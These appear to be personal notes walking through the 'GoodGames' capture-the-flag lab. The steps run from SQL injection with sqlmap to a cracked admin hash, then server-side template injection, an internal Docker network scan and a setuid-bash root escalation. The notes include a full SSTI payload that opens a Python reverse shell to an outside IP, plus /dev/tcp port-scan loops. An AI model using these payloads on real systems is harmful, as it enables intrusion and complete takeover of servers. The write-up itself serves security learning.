
2026-07-30 10:19

Tags: 

## GoodGames

- Nmap
	- ![[Pasted image 20260730102004.png]]
	- Port 80

- Port 80
	- ![[Pasted image 20260730104826.png]]
	- Found the account directory in the top right
	- ![[Pasted image 20260730104903.png]]
	- Tryna catch the packet with burpsuite
	- ![[Pasted image 20260730104928.png]]

- Using sqlmap, the `email` parameter is vulnerable to Time-based SQL-injection
	- ![[Pasted image 20260730105239.png]]
	- Using MySQL
	- ![[Pasted image 20260730111937.png]]
	- ![[Pasted image 20260730112051.png]]
	- Get the hash
	- 2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator

- Log in to that account, go to setting
	- ![[Pasted image 20260730112323.png]]
	- Get another host
	- internal-administration.goodgames.htb
	- Login to this page
	- ![[Pasted image 20260730112440.png]]


- The Full name parameter is vulnerable to **SSTI**
	- **Server-side template injection (SSTI)** is a security bug that happens when a web app puts user text directly into a template. Instead of treating the text as plain data, the server runs it as code.
	- **Bad input:** An app puts user text right into the template code instead of passing it safely as a variable.
	- **Testing:** A tester types a math test like `{{7*7}}` into a form.
	- **Result:** If the page shows `49`, the app is vulnerable because it ran the math on the server.
	- **Risk:** RCE, Data Theft

- It is vulnerable to SSTI
	- ![[Pasted image 20260730113309.png]]
	- Payload test to get id: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
	- ![[Pasted image 20260730113801.png]]
	- Running as root lol
	- Payload to get RCE: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.154\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);"').read() }}`
	- ![[Pasted image 20260730113845.png]]
	- Bingo
	- This is in Docker lol, we can see the Dockerfile


- Get to the host
	- ![[Pasted image 20260730120043.png]]
	- 172.19.0.2 is the Docker address
	- We use the bash loop to ping the host address
	- `for i in {1..254}; do ping -c 1 -W 1 172.19.0.$i &> /dev/null && echo "172.19.0.$i is up"; done`
	- ![[Pasted image 20260730120235.png]]
	- 172.19.0.1 is the host
	- Find the open ports
	- `for port in {1..500}; do timeout 1s bash &> /dev/tcp/172.19.0.1/$port &>/dev/null; done`
	- ![[Pasted image 20260730120705.png]]
	- Port 22 is missing, might be the one  (ssh)
	- ![[Pasted image 20260730120816.png]]

- The augustus's home directory is mounted
	- ![[Pasted image 20260730122209.png]]
	- So we copy the bash from the host, chown to root:root and chmod +s (set uid so augustus can run this as root)
	- ![[Pasted image 20260730122517.png]]
	- Run bash -p and get the flag
## References:

